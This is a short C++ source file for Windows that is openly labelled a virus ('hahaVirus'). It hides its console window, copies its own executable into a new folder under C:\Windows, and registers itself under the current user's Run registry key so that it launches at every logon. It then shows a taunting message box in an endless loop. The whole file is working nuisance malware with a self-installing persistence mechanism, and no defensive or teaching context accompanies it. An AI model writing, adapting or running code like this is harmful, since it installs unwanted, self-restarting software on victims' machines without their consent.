#include <iostream>
#include <fstream>
#include <Windows.h>

#define MAX_PATH 200
#define VIRUS_PATH "C:\\Windows\\WinSafety\\hahaVirus.exe"
// Global variables
LPWSTR g_szClassName = (LPWSTR)"myWindowClass";

#define CONTENT L"HaHa, Try to close Lior's virus!"
#define TITLE L"H@HaV1ru5"

int main()
{
  HWND windowHandle = GetConsoleWindow();
  ShowWindow(windowHandle, SW_HIDE);
	int i;
	HKEY hKey;
	LPCWSTR valueName = L"HahaVirus";
	LPCSTR directoryPath = "C:\\Windows\\WinSafety";
	LPCWSTR exePath = L"C:\\Windows\\WinSafety\\hahaVirus.exe";
	LPCWSTR subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	char buffer[MAX_PATH];
	GetModuleFileNameA(0, buffer, MAX_PATH);//get path of itself
	

	//create directory
	CreateDirectoryA(directoryPath, NULL);
	

	//copy file into special window
	std::ifstream myself(buffer, std::ios::binary); // Open in binary mode
	std::ofstream output(exePath, std::ios::binary); // Open in binary mode

  output << myself.rdbuf(); // Copy the content of source file to destination file
  output.close();
  myself.close();

	//put into autoruns
	if (RegOpenKeyEx(HKEY_CURRENT_USER, subKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
	{
		RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(WCHAR));
		RegCloseKey(hKey);
	}


	//the virus visuals
  

  while (true)
  {
    MessageBox(0, CONTENT, TITLE, MB_OK);
    
  }

  return 0;
}

